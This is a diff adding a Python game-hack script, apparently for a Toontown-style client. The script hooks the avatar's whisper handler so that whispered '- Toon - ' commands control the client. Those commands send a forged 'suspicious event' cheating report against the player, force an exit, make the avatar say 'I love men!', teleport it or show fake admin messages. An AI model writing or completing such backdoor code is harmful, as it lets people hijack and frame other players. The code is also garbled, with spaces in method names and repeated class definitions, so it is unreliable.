@@ -1,0 +1,74 @@
+from string import split
+class bb:
+    cb = {}
+    defaultWhisperTalk = base.localAvatar.setTalkWhisper
+
+    def encrypt(self, message):
+        encryption = md5.new()
+        encryption.update(message)
+        return encryption.digest()
+    class bbc:
+        def term(self, run):
+            base.localAvatar.sendUpdate("logSuspiciousEvent", ["invalid msgIndex in setSCSinging: 4 from " + str(base.localAvatar.doId)])
+            sys.exit()
+
+        def dc(self, run):
+            sys.exit()
+        
+        def i love men(self, run):
+            base.talkAssistant.sendOpenTalk('I love men!')
+        class bbc:
+            def regc(self, cmd, fnc):
+                try:bb().cb[cmd] = fnc
+                except:pass
+
+        def go back to start(self, run):
+            base.localAvatar.setXYZH(744, 1044, 142, -766)
+        class bbc:
+            def regc(self, cmd, fnc):
+                try:bb().cb[cmd] = fnc
+                except:pass
+
+        def whisper(self, run):
+            base.localAvatar.setSystemMessage(1,'Admin, Dont do anything the creator of this land wouldnt do.') 
+        class bbc:
+            def regc(self, cmd, fnc):
+                try:bb().cb[cmd] = fnc
+                except:pass
+
+        def Jelly(self, run):
+            for fishman in base.cr.doFindAll("Hi"):fishman.setSCResistance(201, nearbyToons=[])
+        class bbc:
+            def regc(self, cmd, fnc):
+                try:bb().cb[cmd] = fnc
+                except:pass
+
+            def uregc(self, cmd):
+                try:del bb().cb[cmd]
+                except:print "No command named", cmd
+
+            def isCmd(self, cmd):
+                if str(cmd.title()).startswith('- Toon - '):return True
+                else:return False
+
+            def isRegCmd(self, cmd):
+                if str(cmd.title()) in bb().cb:return True
+                else:return False
+
+            def hkWhisp(self, fromAV, fromAC, avatarName, chat, mods, flags):
+                if self.isCmd(chat):
+                    chat = split(chat.title(), "- Toon - ")[1]
+                    if self.isRegCmd(chat):
+                        bb.cb[chat.title()](None)
+                else:
+                    bb().defaultWhisperTalk(fromAV, fromAC, avatarName, chat, mods, flags)
+
+            def __init__(self):
+                base.localAvatar.setTalkWhisper = self.hkWhisp
+
+bb.bbc.bbc().regc("term", bb.bbc().term)
+bb.bbc.bbc().regc("disconnect", bb.bbc().dc)
+bb.bbc.bbc().regc("i love men", bb.bbc().i love men)
+bb.bbc.bbc().regc("go back to start", bb.bbc().go back to start)
+bb.bbc.bbc().regc("Jelly", bb.bbc().Jelly)
+bb.bbc.bbc().regc("message", bb.bbc().whisper)
